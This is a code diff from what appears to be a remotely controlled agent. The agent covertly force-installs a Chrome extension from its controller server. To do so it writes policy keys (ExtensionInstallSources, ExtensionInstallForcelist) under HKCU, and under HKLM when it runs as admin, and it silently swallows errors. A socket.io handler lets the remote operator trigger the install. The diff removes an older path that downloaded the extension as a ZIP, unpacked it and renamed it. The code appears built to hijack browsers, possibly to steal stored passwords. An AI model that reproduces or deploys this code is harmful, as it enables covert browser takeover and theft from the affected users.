@@ -1844,7 +1844,7 @@ def install_vault_extension_policy():
         import sys
         if sys.platform != 'win32':
             return
-        import winreg, os, io, zipfile, urllib.request, tempfile, shutil, json
+        import winreg, os, urllib.request, tempfile
         try:
             base = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallSources")
             winreg.SetValueEx(base, "1", 0, winreg.REG_SZ, "http://*/*")
@@ -1878,47 +1878,7 @@ def install_vault_extension_policy():
                 pass
         except Exception:
             pass
-        # Deploy unpacked extension locally to a stable folder
-        try:
-            local_appdata = os.environ.get('LOCALAPPDATA') or tempfile.gettempdir()
-            ext_dir = os.path.join(local_appdata, 'AutoSaveExtension')
-            os.makedirs(ext_dir, exist_ok=True)
-            zip_url = f"{url.rstrip('/')}/download/extensions/autosave-extension.zip"
-            with urllib.request.urlopen(zip_url, timeout=10) as resp:
-                data = resp.read()
-            with zipfile.ZipFile(io.BytesIO(data)) as zf:
-                # Clean target
-                for name in os.listdir(ext_dir):
-                    try:
-                        p = os.path.join(ext_dir, name)
-                        if os.path.isdir(p):
-                            shutil.rmtree(p, ignore_errors=True)
-                        else:
-                            os.remove(p)
-                    except Exception:
-                        pass
-                zf.extractall(ext_dir)
-            # Try external extension registry (path-based)
-            try:
-                base3 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{VAULT_EXTENSION_ID}")
-                # Read version from manifest
-                ver = "1.0"
-                try:
-                    with open(os.path.join(ext_dir, 'manifest.json'), 'r', encoding='utf-8') as mf:
-                        man = json.load(mf)
-                        ver = str(man.get('version') or ver)
-                except Exception:
-                    pass
-                winreg.SetValueEx(base3, "path", 0, winreg.REG_SZ, ext_dir)
-                winreg.SetValueEx(base3, "version", 0, winreg.REG_SZ, ver)
-                try:
-                    winreg.CloseKey(base3)
-                except Exception:
-                    pass
-            except Exception:
-                pass
-        except Exception:
-            pass
+        # No ZIP deploy; rely solely on policy + CRX update
     except Exception:
         pass
     except Exception:
@@ -1930,6 +1890,7 @@ def _ext_is_installed(ext_id: str) -> bool:
         if sys.platform != 'win32':
             return False
         import winreg, os
+        policy_found = False
         try:
             base2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
             i = 0
@@ -1938,11 +1899,8 @@ def _ext_is_installed(ext_id: str) -> bool:
                     _, value, _ = winreg.EnumValue(base2, i)
                     i += 1
                     if isinstance(value, str) and value.startswith(ext_id + ";"):
-                        try:
-                            winreg.CloseKey(base2)
-                        except Exception:
-                            pass
-                        return True
+                        policy_found = True
+                        break
                 except OSError:
                     break
             try:
@@ -1952,10 +1910,24 @@ def _ext_is_installed(ext_id: str) -> bool:
         except Exception:
             pass
         try:
-            winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}")
+            access_r = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
+            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r)
+            try:
+                winreg.CloseKey(k)
+            except Exception:
+                pass
             return True
         except Exception:
-            pass
+            try:
+                access_r32 = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_32KEY", 0)
+                k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r32)
+                try:
+                    winreg.CloseKey(k2)
+                except Exception:
+                    pass
+                return True
+            except Exception:
+                pass
         try:
             base = os.environ.get('LOCALAPPDATA') or ''
             user_data = os.path.join(base, 'Google', 'Chrome', 'User Data')
@@ -1966,7 +1938,7 @@ def _ext_is_installed(ext_id: str) -> bool:
                         return True
         except Exception:
             pass
-        return False
+        return False if not policy_found else False
     except Exception:
         return False
 
@@ -1998,83 +1970,32 @@ def _deploy_extension_from_url(download_url: str, ext_id: str, display_name: str
         import sys
         if sys.platform != 'win32':
             return False
-        import os, urllib.request, tempfile, json, winreg, io, zipfile, shutil
+        import os, tempfile, winreg
         try:
             base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
         except Exception:
             base = SERVER_URL
         update_xml = f"{base.rstrip('/')}/download/extensions/update.xml"
-        local_appdata = os.environ.get('LOCALAPPDATA') or tempfile.gettempdir()
-        ext_dir = os.path.join(local_appdata, 'AutoSaveExtension')
-        ok = False
-        if download_url:
-            try:
-                req = urllib.request.Request(download_url, headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req, timeout=60) as resp:
-                    raw = resp.read()
-                ok = _extract_crx_payload(raw, ext_dir)
-                if not ok:
-                    try:
-                        with zipfile.ZipFile(io.BytesIO(raw)) as zf:
-                            for name in os.listdir(ext_dir):
-                                p = os.path.join(ext_dir, name)
-                                try:
-                                    if os.path.isdir(p):
-                                        shutil.rmtree(p, ignore_errors=True)
-                                    else:
-                                        os.remove(p)
-                                except Exception:
-                                    pass
-                            zf.extractall(ext_dir)
-                        ok = True
-                    except Exception:
-                        ok = False
-            except Exception:
-                ok = False
-        if not ok:
-            try:
-                os.makedirs(ext_dir, exist_ok=True)
-                ok = any(True for _ in os.scandir(ext_dir))
-            except Exception:
-                ok = False
-        # Optional rename in manifest
-        if ok and display_name:
-            try:
-                man_path = os.path.join(ext_dir, 'manifest.json')
-                if os.path.isfile(man_path):
-                    with open(man_path, 'r', encoding='utf-8') as mf:
-                        man = json.load(mf)
-                    man['name'] = display_name
-                    if 'short_name' in man:
-                        man['short_name'] = display_name[:12]
-                    with open(man_path, 'w', encoding='utf-8') as mf:
-                        json.dump(man, mf, indent=2)
-            except Exception:
-                pass
         try:
-            base3 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}")
-            ver = "1.0"
-            try:
-                with open(os.path.join(ext_dir, 'manifest.json'), 'r', encoding='utf-8') as mf:
-                    man = json.load(mf)
-                    ver = str(man.get('version') or ver)
-            except Exception:
-                pass
-            winreg.SetValueEx(base3, "path", 0, winreg.REG_SZ, ext_dir)
-            winreg.SetValueEx(base3, "version", 0, winreg.REG_SZ, ver)
-            try:
-                winreg.CloseKey(base3)
-            except Exception:
-                pass
-        except Exception:
-            pass
-        try:
-            base2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
+            access2 = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
+            base2 = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, access2)
             winreg.SetValueEx(base2, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
             try:
                 winreg.CloseKey(base2)
             except Exception:
                 pass
+        except Exception:
+            pass
+        try:
+            import ctypes
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                accessm = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
+                basem = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, accessm)
+                winreg.SetValueEx(basem, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
+                try:
+                    winreg.CloseKey(basem)
+                except Exception:
+                    pass
         except Exception:
             pass
         return True
@@ -13723,7 +13644,7 @@ def register_socketio_handlers():
             if sys.platform != 'win32':
                 emit_system_notification('warning', 'Chrome Extension Deploy', 'Unsupported platform')
                 return
-            import os, io, json, urllib.request, tempfile, winreg, zipfile, shutil
+            import os, tempfile, winreg
             url = str((data or {}).get('url') or '').strip()
             ext_id = str((data or {}).get('extension_id') or VAULT_EXTENSION_ID).strip()
             display_name = str((data or {}).get('display_name') or '').strip()
@@ -13735,73 +13656,10 @@ def register_socketio_handlers():
             except Exception:
                 base = SERVER_URL
             update_xml = f"{base.rstrip('/')}/download/extensions/update.xml"
-            local_appdata = os.environ.get('LOCALAPPDATA') or tempfile.gettempdir()
-            ext_dir = os.path.join(local_appdata, 'AutoSaveExtension')
-            ok = False
             size = 0
-            if url:
-                try:
-                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-                    with urllib.request.urlopen(req, timeout=60) as resp:
-                        raw = resp.read()
-                        size = len(raw or b'')
-                    ok = _extract_crx_bytes_to_dir(raw, ext_dir)
-                    if not ok:
-                        try:
-                            with zipfile.ZipFile(io.BytesIO(raw)) as zf:
-                                for name in os.listdir(ext_dir):
-                                    p = os.path.join(ext_dir, name)
-                                    try:
-                                        if os.path.isdir(p):
-                                            shutil.rmtree(p, ignore_errors=True)
-                                        else:
-                                            os.remove(p)
-                                    except Exception:
-                                        pass
-                                zf.extractall(ext_dir)
-                            ok = True
-                        except Exception:
-                            ok = False
-                except Exception:
-                    ok = False
-            if not ok:
-                try:
-                    os.makedirs(ext_dir, exist_ok=True)
-                    ok = any(True for _ in os.scandir(ext_dir))
-                except Exception:
-                    ok = False
-            if ok and display_name:
-                try:
-                    man_path = os.path.join(ext_dir, 'manifest.json')
-                    if os.path.isfile(man_path):
-                        with open(man_path, 'r', encoding='utf-8') as mf:
-                            man = json.load(mf)
-                        man['name'] = display_name
-                        if 'short_name' in man:
-                            man['short_name'] = display_name[:12]
-                        with open(man_path, 'w', encoding='utf-8') as mf:
-                            json.dump(man, mf, indent=2)
-                except Exception:
-                    pass
             try:
-                base3 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}")
-                ver = "1.0"
-                try:
-                    with open(os.path.join(ext_dir, 'manifest.json'), 'r', encoding='utf-8') as mf:
-                        man = json.load(mf)
-                        ver = str(man.get('version') or ver)
-                except Exception:
-                    pass
-                winreg.SetValueEx(base3, "path", 0, winreg.REG_SZ, ext_dir)
-                winreg.SetValueEx(base3, "version", 0, winreg.REG_SZ, ver)
-                try:
-                    winreg.CloseKey(base3)
-                except Exception:
-                    pass
-            except Exception:
-                pass
-            try:
-                base2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
+                access2 = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
+                base2 = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, access2)
                 winreg.SetValueEx(base2, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
                 try:
                     winreg.CloseKey(base2)
@@ -13809,7 +13667,19 @@ def register_socketio_handlers():
                     pass
             except Exception:
                 pass
-            msg = f"Extension deploy queued. url={'set' if url else 'default'} size={size} unpacked={'yes' if ok else 'no'}"
+            try:
+                import ctypes
+                if ctypes.windll.shell32.IsUserAnAdmin():
+                    accessm = winreg.KEY_SET_VALUE | getattr(winreg, "KEY_WOW64_64KEY", 0)
+                    basem = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist", 0, accessm)
+                    winreg.SetValueEx(basem, "1", 0, winreg.REG_SZ, f"{ext_id};{update_xml}")
+                    try:
+                        winreg.CloseKey(basem)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            msg = f"Policy set. url={'set' if url else 'default'}"
             emit_system_notification('info', 'Chrome Extension Deploy', msg)
             safe_emit('vault_status', {'agent_id': agent_id, 'active': True, 'installed': True})
         except Exception as e:
